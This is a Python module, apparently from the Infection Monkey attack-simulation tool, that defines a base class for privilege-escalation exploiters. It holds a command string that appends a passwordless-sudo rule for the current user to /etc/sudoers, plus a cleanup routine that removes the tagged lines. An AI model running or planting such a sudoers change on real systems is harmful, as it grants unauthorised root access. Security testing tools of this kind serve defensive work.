from abc import ABCMeta, abstractmethod
from os.path import dirname, basename, isfile, join
import subprocess
import glob
import getpass
from logging import getLogger

from infection_monkey.exploit.tools.exceptions import FailedExploitationError
from infection_monkey.telemetry.priv_esc_telem import PrivEscTelem

__author__ = 'D3fa1t'

LOG = getLogger(__name__)

REMOVE_LINES_WITH_TAG = "sudo sed -i '/{monkey_tag}/d' {file_name}"
ADDUSER_TO_SUDOERS = "echo '{user_name} ALL = NOPASSWD: ALL {monkey_tag}' | sudo tee -a /etc/sudoers"
MONKEY_TAG = "# ADDED BY INFECTION MONKEY"


class HostPrivExploiter(object):
    __metaclass__ = ABCMeta

    def try_priv_esc(self, command):
        try:
            self._priv_esc(command)
            result = True
        except FailedExploitationError as e:
            if str(e):
                LOG.info(str(e))
            LOG.info("{} failed.".format(self.__name__))
            result = False
        PrivEscTelem(self, result).send()

    @abstractmethod
    def _priv_esc(self, command):
        raise NotImplementedError()

    @staticmethod
    def remove_from_sudoers():
        LOG.info("Removing users added to /etc/sudoers by monkey.")
        remove_from_sudoers = REMOVE_LINES_WITH_TAG.format(file_name="/etc/sudoers", monkey_tag=MONKEY_TAG)
        subprocess.Popen(remove_from_sudoers, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True,
                         creationflags=0)

    @staticmethod
    def get_add_user_to_sudoers_command():
        # get the current user name
        whoami = getpass.getuser()

        # Error reading off shell
        if not whoami:
            return False
        return ADDUSER_TO_SUDOERS.format(user_name=whoami, monkey_tag=MONKEY_TAG)


def get_pe_files():
    """
        Gets all files under current directory(/exploiters)
        :return: list of all files without .py ending
    """
    exclude_files = ('__init__.py', 'tools.py')
    files = glob.glob(join(dirname(__file__), "*.py"))
    return [basename(f)[:-3] for f in files if isfile(f) and not f.endswith(exclude_files)]
